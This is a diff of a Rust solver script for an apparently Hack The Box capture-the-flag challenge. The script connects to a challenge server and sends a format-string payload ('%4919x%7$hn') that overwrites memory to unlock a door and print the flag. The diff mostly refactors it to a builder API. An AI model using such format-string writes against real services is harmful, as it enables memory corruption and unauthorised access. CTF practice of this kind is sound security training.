@@ -2,25 +2,19 @@ use ctf_pwn::io::*;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let mut pipe = TcpPipe::connect("159.65.20.166:31526").await?;
+    let mut pipe = TcpPipe::connect("123.123.123.123:1337").await?;
 
-    let mut payload = Payload::new();
-    payload
-        .recv_until("> ")
-        .push("1\n")
+    let payload = Payload::builder()
+        .recv_until("> ", false)
+        .push_line("1")
         .send()
-        .recv_until("Insert card's serial number: ")
-        .push("%4919x%7$hn\n")
+        .recv_until("Insert card's serial number: ", false)
+        .push_line("%4919x%7$hn")
         .send()
-        .recv_until("[+] Door opened, you can proceed with the passphrase: ")
-        ;
+        .recv_regex_utf8(r"HTB\{[^\}]+\}")
+        .print()
+        .build();
 
-    pipe.payload(&payload).await?;
-
-    let flag = pipe.recv_until_utf8("}", false).await?;
-    
-    println!("FLAG: {flag}");    
-    
-    //pipe.interactive_shell().await?;
+    pipe.payload(payload).await?;
     Ok(())
 }
